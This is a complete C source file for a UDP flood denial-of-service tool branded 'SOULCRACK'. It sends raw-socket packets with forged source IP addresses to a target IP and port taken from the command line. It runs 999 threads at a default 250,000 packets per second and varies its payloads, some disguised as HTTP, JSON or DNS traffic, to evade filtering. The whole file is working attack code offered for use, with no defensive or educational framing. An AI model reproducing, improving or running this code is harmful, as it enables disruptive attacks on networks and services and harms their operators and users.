#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <poll.h>
#include <sys/resource.h>

#define MAX_THREADS 999
#define MIN_PACKET_SIZE 512
#define MAX_PACKET_SIZE 1400
#define SPOOFED_IPS_COUNT 65536

// Custom IP header structure for portability
struct ip_header {
    uint8_t  ip_vhl;        // version << 4 | header length >> 2
    uint8_t  ip_tos;        // type of service
    uint16_t ip_len;        // total length
    uint16_t ip_id;         // identification
    uint16_t ip_off;        // fragment offset field
    uint8_t  ip_ttl;        // time to live
    uint8_t  ip_p;          // protocol
    uint16_t ip_sum;        // checksum
    struct in_addr ip_src;  // source address
    struct in_addr ip_dst;  // dest address
};

// UDP header structure
struct udp_header {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

typedef struct {
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    int duration;
    int threads;
    int pps;
    volatile atomic_int running;
} attack_config_t;

typedef struct {
    attack_config_t *config;
    int thread_id;
    atomic_ulong packets_sent;
    atomic_ulong bytes_sent;
    pthread_t thread;
} thread_data_t;

typedef struct {
    atomic_ulong total_packets;
    atomic_ulong total_bytes;
    atomic_ulong total_pps;
    time_t start_time;
    pthread_mutex_t lock;
} stats_t;

static attack_config_t config;
static stats_t stats;
static thread_data_t *threads;
static uint32_t *spoofed_ips;
static int spoofed_ips_count = 0;

// 🚀 Enhanced secure random bytes generator
void secure_random_bytes(unsigned char *buffer, size_t length) {
    static int fd = -1;
    if (fd == -1) {
        fd = open("/dev/urandom", O_RDONLY);
        if (fd < 0) {
            fprintf(stderr, "[-] Failed to open /dev/urandom, using fallback\n");
        }
    }
    
    if (fd >= 0) {
        size_t total_read = 0;
        while (total_read < length) {
            ssize_t result = read(fd, buffer + total_read, length - total_read);
            if (result <= 0) {
                break;
            }
            total_read += result;
        }
        // Don't close fd to keep it open for performance
    } else {
        // High-quality fallback
        unsigned int seed = (unsigned int)(time(NULL) + getpid() + (long)buffer);
        for (size_t i = 0; i < length; i++) {
            buffer[i] = rand_r(&seed) % 256;
            // Add more entropy
            buffer[i] ^= (i * 0x9E3779B9) % 256;
        }
    }
}

// 🎯 Improved spoofed IP generation
void generate_spoofed_ips(void) {
    spoofed_ips = malloc(SPOOFED_IPS_COUNT * sizeof(uint32_t));
    if (!spoofed_ips) {
        fprintf(stderr, "[-] Failed to allocate memory for spoofed IPs\n");
        exit(1);
    }
    
    printf("[*] Generating %d spoofed IP addresses...\n", SPOOFED_IPS_COUNT);
    
    unsigned char random_buffer[SPOOFED_IPS_COUNT * 4];
    secure_random_bytes(random_buffer, sizeof(random_buffer));
    
    for (int i = 0; i < SPOOFED_IPS_COUNT; i++) {
        // Use proper IP ranges for more realistic spoofing
        int range_selector = random_buffer[i * 4] % 8;
        uint32_t base_ip = 0;
        
        switch (range_selector) {
            case 0: case 1: // 1.0.0.0 - 9.255.255.255
                base_ip = (1 + (random_buffer[i * 4 + 1] % 9)) << 24;
                break;
            case 2: case 3: // 11.0.0.0 - 126.255.255.255
                base_ip = (11 + (random_buffer[i * 4 + 1] % 116)) << 24;
                break;
            case 4: case 5: // 128.0.0.0 - 171.255.255.255
                base_ip = (128 + (random_buffer[i * 4 + 1] % 44)) << 24;
                break;
            case 6: case 7: // 173.0.0.0 - 223.255.255.255
                base_ip = (173 + (random_buffer[i * 4 + 1] % 51)) << 24;
                break;
        }
        
        // Add the remaining octets
        base_ip |= (random_buffer[i * 4 + 2] << 16) | (random_buffer[i * 4 + 3] << 8) | (random_buffer[(i * 4 + 1) % sizeof(random_buffer)]);
        spoofed_ips[i] = base_ip;
    }
    spoofed_ips_count = SPOOFED_IPS_COUNT;
    printf("[+] Generated %d spoofed IP addresses\n", spoofed_ips_count);
}

// 🔧 Optimized checksum calculation
unsigned short calculate_checksum(unsigned short *ptr, size_t nbytes) {
    unsigned long sum = 0;
    unsigned short oddbyte = 0;
    unsigned short answer = 0;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short)~sum;

    return answer;
}

// 🛠️ Enhanced raw socket creation
int create_raw_socket(void) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("[-] socket() failed");
        return -1;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("[-] setsockopt(IP_HDRINCL) failed");
        close(sockfd);
        return -1;
    }

    // Enhanced socket options for performance
    int buf_size = 2 * 1024 * 1024; // 2MB buffer
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size)) < 0) {
        perror("[-] setsockopt(SO_SNDBUF) failed");
    }

    // Set socket to non-blocking for better performance
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);

    return sockfd;
}

// 🎭 Advanced dynamic payload generation
void generate_dynamic_payload(unsigned char *payload, size_t *payload_size, int thread_id, unsigned long packet_num) {
    // Dynamic size for more variability
    *payload_size = MIN_PACKET_SIZE + (rand() % (MAX_PACKET_SIZE - MIN_PACKET_SIZE + 1));
    
    int pattern_type = (packet_num + thread_id) % 12; // More patterns
    
    switch (pattern_type) {
        case 0: // Random data
            secure_random_bytes(payload, *payload_size);
            break;
            
        case 1: // HTTP-like traffic
            {
                int base_len = snprintf((char*)payload, *payload_size, 
                    "GET /?id=%lu&thread=%d&time=%ld HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: SOULCRACK-Bot/%d.%lu\r\n"
                    "Accept: */*\r\n"
                    "X-Forwarded-For: %d.%d.%d.%d\r\n\r\n",
                    packet_num, thread_id, time(NULL), 
                    config.target_ip,
                    thread_id, packet_num,
                    rand() % 256, rand() % 256, rand() % 256, rand() % 256);
                
                if (base_len > 0 && (size_t)base_len < *payload_size) {
                    secure_random_bytes(payload + base_len, *payload_size - base_len);
                }
            }
            break;
            
        case 2: // JSON data
            {
                int base_len = snprintf((char*)payload, *payload_size, 
                    "{\"timestamp\":%ld,\"sequence\":%lu,\"thread\":%d,\"data\":\"", 
                    time(NULL), packet_num, thread_id);
                
                if (base_len > 0) {
                    const char *chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                    size_t data_len = *payload_size - base_len - 3;
                    for (size_t i = 0; i < data_len && i < *payload_size - 3; i++) {
                        payload[base_len + i] = chars[rand() % 62];
                    }
                    if (*payload_size >= base_len + 3) {
                        strcpy((char*)payload + base_len + data_len, "\"}");
                    }
                }
            }
            break;
            
        case 3: // DNS-like payload (simplified)
            payload[0] = rand() % 256; // Transaction ID
            payload[1] = rand() % 256;
            payload[2] = 0x01; // Flags
            payload[3] = 0x00;
            payload[4] = 0x00; // Questions
            payload[5] = 0x01;
            payload[6] = 0x00; // Answers
            payload[7] = 0x00;
            payload[8] = 0x00; // Authority
            payload[9] = 0x00;
            payload[10] = 0x00; // Additional
            payload[11] = 0x00;
            
            // Fill remaining with pattern
            for (size_t i = 12; i < *payload_size; i++) {
                payload[i] = (unsigned char)((i * thread_id + packet_num) % 256);
            }
            break;
            
        case 4: // Binary pattern with XOR
            for (size_t i = 0; i < *payload_size; i++) {
                payload[i] = (unsigned char)((i * 0x9E3779B9) ^ (packet_num * 0x85EBCA6B) ^ (thread_id * 0xC2B2AE35));
                if (i % 8 == 0) payload[i] ^= 0xFF;
            }
            break;
            
        default: // Mixed patterns
            for (size_t i = 0; i < *payload_size; i++) {
                int selector = (i + thread_id + packet_num) % 8;
                switch (selector) {
                    case 0: payload[i] = (i + packet_num) % 256; break;
                    case 1: payload[i] = (i * thread_id) % 256; break;
                    case 2: payload[i] = ~((i + thread_id) % 256); break;
                    case 3: payload[i] = (i ^ packet_num ^ thread_id) % 256; break;
                    default: payload[i] = rand() % 256; break;
                }
            }
            break;
    }
}

// 🚀 Enhanced packet creation with better spoofing
int create_spoofed_packet(unsigned char *packet, size_t *packet_size, 
                         uint32_t src_ip, uint32_t dest_ip, 
                         int src_port, int dest_port,
                         int thread_id, unsigned long packet_num) {
    struct ip_header *ip = (struct ip_header *)packet;
    struct udp_header *udp = (struct udp_header *)(packet + sizeof(struct ip_header));
    unsigned char *payload = packet + sizeof(struct ip_header) + sizeof(struct udp_header);
    size_t payload_len;
    
    generate_dynamic_payload(payload, &payload_len, thread_id, packet_num);
    
    size_t udp_len = sizeof(struct udp_header) + payload_len;
    *packet_size = sizeof(struct ip_header) + udp_len;
    
    // Build IP header
    ip->ip_vhl = (4 << 4) | (5); // IPv4, 5 words header
    ip->ip_tos = 0;
    ip->ip_len = htons((uint16_t)*packet_size);
    ip->ip_id = htons((uint16_t)((thread_id << 8) | (packet_num & 0xFF)));
    ip->ip_off = 0;
    ip->ip_ttl = 64 + (thread_id % 32);
    ip->ip_p = IPPROTO_UDP;
    ip->ip_sum = 0;
    ip->ip_src.s_addr = src_ip;
    ip->ip_dst.s_addr = dest_ip;
    
    // Calculate IP checksum
    ip->ip_sum = calculate_checksum((unsigned short *)ip, sizeof(struct ip_header));
    
    // Build UDP header
    udp->source = htons((uint16_t)src_port);
    udp->dest = htons((uint16_t)dest_port);
    udp->len = htons((uint16_t)udp_len);
    udp->check = 0; // Optional for IPv4
    
    return 0;
}

// ⚡ Optimized attack thread
void *attack_thread(void *arg) {
    thread_data_t *tdata = (thread_data_t *)arg;
    attack_config_t *cfg = tdata->config;
    
    int sockfd = create_raw_socket();
    if (sockfd < 0) {
        fprintf(stderr, "[-] Thread %d: Failed to create socket\n", tdata->thread_id);
        return NULL;
    }
    
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons((uint16_t)cfg->target_port);
    inet_pton(AF_INET, cfg->target_ip, &dest_addr.sin_addr);
    
    unsigned char packet[65536];
    size_t packet_size;
    
    struct timeval tv_start, tv_now;
    gettimeofday(&tv_start, NULL);
    
    unsigned long packets_this_thread = 0;
    unsigned long long thread_start_time = (unsigned long long)tv_start.tv_sec * 1000000ULL + (unsigned long long)tv_start.tv_usec;
    
    unsigned int thread_seed = (unsigned int)(tdata->thread_id + time(NULL) + getpid());
    
    printf("[+] Thread %d started successfully\n", tdata->thread_id);
    
    while (atomic_load(&cfg->running)) {
        gettimeofday(&tv_now, NULL);
        unsigned long long current_time = (unsigned long long)tv_now.tv_sec * 1000000ULL + (unsigned long long)tv_now.tv_usec;
        unsigned long long elapsed = current_time - thread_start_time;
        
        if (elapsed >= (unsigned long long)cfg->duration * 1000000ULL) {
            break;
        }
        
        // Rate limiting
        unsigned long target_packets = (unsigned long)((elapsed * (unsigned long long)(cfg->pps / cfg->threads)) / 1000000ULL);
        if (packets_this_thread >= target_packets) {
            usleep(1000); // Reduced sleep for better performance
            continue;
        }
        
        // Generate spoofed IP and port
        uint32_t spoofed_ip = spoofed_ips[rand_r(&thread_seed) % spoofed_ips_count];
        int spoofed_port = 1024 + (rand_r(&thread_seed) % 64512);
        
        // Create packet
        create_spoofed_packet(packet, &packet_size, spoofed_ip, dest_addr.sin_addr.s_addr,
                            spoofed_port, cfg->target_port, tdata->thread_id, packets_this_thread);
        
        // Send packet
        ssize_t sent = sendto(sockfd, packet, packet_size, 0,
                            (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        
        if (sent > 0) {
            packets_this_thread++;
            atomic_fetch_add(&tdata->packets_sent, 1);
            atomic_fetch_add(&tdata->bytes_sent, (unsigned long)sent);
            
            pthread_mutex_lock(&stats.lock);
            atomic_fetch_add(&stats.total_packets, 1);
            atomic_fetch_add(&stats.total_bytes, (unsigned long)sent);
            pthread_mutex_unlock(&stats.lock);
        } else if (errno != EAGAIN && errno != EWOULDBLOCK) {
            // Only print non-blocking errors
            if (packets_this_thread % 1000 == 0) { // Reduce error spam
                perror("[-] sendto error");
            }
        }
        
        // Adaptive sleep for rate control
        if (cfg->pps > 0 && packets_this_thread % 100 == 0) {
            unsigned long long expected_time = (packets_this_thread * 1000000ULL) / (unsigned long long)(cfg->pps / cfg->threads);
            if (expected_time > elapsed && expected_time - elapsed > 1000) {
                usleep(500);
            }
        }
    }
    
    close(sockfd);
    printf("[+] Thread %d finished (%lu packets)\n", tdata->thread_id, packets_this_thread);
    return NULL;
}

// 📊 Enhanced statistics thread
void *stats_thread(void *arg) {
    (void)arg;
    time_t start_time = time(NULL);
    unsigned long last_packets = 0;
    unsigned long last_bytes = 0;
    time_t last_time = start_time;
    
    printf("\n🎯 SOULCRACK UDP Flood Started - Press Ctrl+C to stop\n");
    printf("┌─────────────────────┬──────────────┬────────────┬──────────────┬────────────┬──────────┐\n");
    printf("│ %-20s │ %-12s │ %-10s │ %-12s │ %-10s │ %-8s │\n", 
           "Time", "Total Packets", "PPS", "Total GB", "Gbps", "Threads");
    printf("├─────────────────────┼──────────────┼────────────┼──────────────┼────────────┼──────────┤\n");
    
    while (atomic_load(&config.running)) {
        sleep(2); // Update every 2 seconds for smoother stats
        
        time_t current_time = time(NULL);
        unsigned long current_packets = atomic_load(&stats.total_packets);
        unsigned long current_bytes = atomic_load(&stats.total_bytes);
        
        double interval = difftime(current_time, last_time);
        
        if (interval > 0) {
            unsigned long interval_packets = current_packets - last_packets;
            unsigned long interval_bytes = current_bytes - last_bytes;
            
            double pps = (double)interval_packets / interval;
            double gbps = (interval_bytes * 8.0) / (interval * 1000000000.0);
            double total_gb = (double)current_bytes / (1024.0 * 1024.0 * 1024.0);
            
            char time_str[20];
            strftime(time_str, sizeof(time_str), "%H:%M:%S", localtime(&current_time));
            
            printf("\r│ %-20s │ %-12lu │ %-10.0f │ %-12.3f │ %-10.2f │ %-8d │",
                   time_str, current_packets, pps, total_gb, gbps, config.threads);
            fflush(stdout);
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    
    printf("\n└─────────────────────┴──────────────┴────────────┴──────────────┴────────────┴──────────┘\n");
    return NULL;
}

// 🛡️ Signal handler for graceful shutdown
void signal_handler(int sig) {
    printf("\n[!] Received signal %d, shutting down gracefully...\n", sig);
    atomic_store(&config.running, 0);
}

// ✅ Enhanced parameter validation
int validate_parameters(int argc, char *argv[]) {
    if (argc != 4) {
        printf("🔥 SOULCRACK UDP Flooder with Advanced Spoofing\n");
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 30\n", argv[0]);
        printf("Defaults: threads=%d, pps=250,000\n", MAX_THREADS);
        printf("Note: Requires root privileges for raw sockets\n");
        return -1;
    }
    
    // Set configuration
    config.threads = MAX_THREADS;
    config.pps = 250000;
    config.duration = atoi(argv[3]);
    
    strncpy(config.target_ip, argv[1], INET_ADDRSTRLEN - 1);
    config.target_ip[INET_ADDRSTRLEN - 1] = '\0';
    config.target_port = atoi(argv[2]);
    
    // Enhanced validation
    if (config.duration <= 0 || config.duration > 3600) {
        printf("[-] Error: Duration must be 1-3600 seconds\n");
        return -1;
    }
    
    if (config.target_port <= 0 || config.target_port > 65535) {
        printf("[-] Error: Port must be 1-65535\n");
        return -1;
    }
    
    struct in_addr addr;
    if (inet_pton(AF_INET, config.target_ip, &addr) != 1) {
        printf("[-] Error: Invalid IP address\n");
        return -1;
    }
    
    printf("[+] Parameters validated successfully\n");
    return 0;
}

// 💪 System optimization
void increase_limits(void) {
    struct rlimit rl;
    
    // Increase stack size
    if (getrlimit(RLIMIT_STACK, &rl) == 0) {
        rl.rlim_cur = 32 * 1024 * 1024; // 32MB
        setrlimit(RLIMIT_STACK, &rl);
    }
    
    // Increase file descriptors
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = 100000;
        rl.rlim_max = 100000;
        setrlimit(RLIMIT_NOFILE, &rl);
    }
    
    printf("[+] System limits increased for optimal performance\n");
}

// 🚀 Main function with enhanced error handling
int main(int argc, char *argv[]) {
    printf("🔥 === SOULCRACK UDP FLOODER WITH IP SPOOFING === 🔥\n");
    printf("[*] Initializing high-performance attack engine...\n");
    
    // Root check
    if (geteuid() != 0) {
        printf("[-] Error: Root privileges required for raw socket operations\n");
        printf("[-] Run with: sudo %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }
    
    // System optimization
    increase_limits();
    
    // Parameter validation
    if (validate_parameters(argc, argv) != 0) {
        return 1;
    }
    
    // Initialize spoofed IPs
    generate_spoofed_ips();
    
    // Initialize atomic variables
    atomic_store(&config.running, 1);
    atomic_store(&stats.total_packets, 0);
    atomic_store(&stats.total_bytes, 0);
    stats.start_time = time(NULL);
    pthread_mutex_init(&stats.lock, NULL);
    
    // Signal handling
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Display attack configuration
    printf("\n🎯 ATTACK CONFIGURATION:\n");
    printf("   ├─ Target: %s:%d\n", config.target_ip, config.target_port);
    printf("   ├─ Duration: %d seconds\n", config.duration);
    printf("   ├─ Threads: %d\n", config.threads);
    printf("   ├─ Packets/sec: %d\n", config.pps);
    printf("   ├─ Spoofed IPs: %d\n", spoofed_ips_count);
    printf("   └─ Estimated Power: %.2f Tbps\n", 
           (config.pps * (MAX_PACKET_SIZE + MIN_PACKET_SIZE) / 2 * 8.0) / 1000000000000.0);
    
    // Allocate thread data
    threads = calloc(config.threads, sizeof(thread_data_t));
    if (!threads) {
        printf("[-] Error: Memory allocation failed for threads\n");
        free(spoofed_ips);
        return 1;
    }
    
    // Start statistics thread
    pthread_t stats_tid;
    if (pthread_create(&stats_tid, NULL, stats_thread, NULL) != 0) {
        printf("[-] Error: Could not create stats thread\n");
        free(threads);
        free(spoofed_ips);
        return 1;
    }
    
    // Start attack threads
    printf("\n[*] Starting %d attack threads...\n", config.threads);
    int threads_created = 0;
    
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 4 * 1024 * 1024); // 4MB stack
    
    for (int i = 0; i < config.threads && atomic_load(&config.running); i++) {
        threads[i].config = &config;
        threads[i].thread_id = i;
        atomic_store(&threads[i].packets_sent, 0);
        atomic_store(&threads[i].bytes_sent, 0);
        
        if (pthread_create(&threads[i].thread, &attr, attack_thread, &threads[i]) == 0) {
            threads_created++;
        } else {
            fprintf(stderr, "[-] Warning: Could not create thread %d\n", i);
            // Continue with available threads
        }
        
        // Stagger thread creation
        if (i % 50 == 0) {
            usleep(10000);
        }
    }
    
    pthread_attr_destroy(&attr);
    printf("[+] %d/%d threads started successfully\n", threads_created, config.threads);
    
    if (threads_created == 0) {
        printf("[-] Error: No threads were created\n");
        atomic_store(&config.running, 0);
        goto cleanup;
    }
    
    printf("[*] Attack running... Waiting for completion\n");
    
    // Wait for all threads to complete
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i].thread, NULL);
    }
    
    // Cleanup
    cleanup:
    atomic_store(&config.running, 0);
    pthread_join(stats_tid, NULL);
    
    // Final statistics
    time_t end_time = time(NULL);
    double total_time = difftime(end_time, stats.start_time);
    unsigned long total_packets = atomic_load(&stats.total_packets);
    unsigned long total_bytes = atomic_load(&stats.total_bytes);
    
    printf("\n🎉 === ATTACK COMPLETE === 🎉\n");
    printf("   ├─ Total packets sent: %'lu\n", total_packets);
    printf("   ├─ Total data sent: %.2f GB\n", (double)total_bytes / (1024.0 * 1024.0 * 1024.0));
    printf("   ├─ Total traffic: %.2f Tbps\n", (total_bytes * 8.0) / (total_time * 1000000000000.0));
    
    if (total_time > 0) {
        printf("   ├─ Average PPS: %'.0f\n", total_packets / total_time);
        printf("   ├─ Average bandwidth: %.2f Gbps\n", (total_bytes * 8.0) / (total_time * 1000000000.0));
    }
    printf("   └─ Total duration: %.2f seconds\n", total_time);
    printf("\n💪 Made with power by @SOULCRACK\n");
    
    // Cleanup resources
    pthread_mutex_destroy(&stats.lock);
    free(threads);
    free(spoofed_ips);
    
    return 0;
}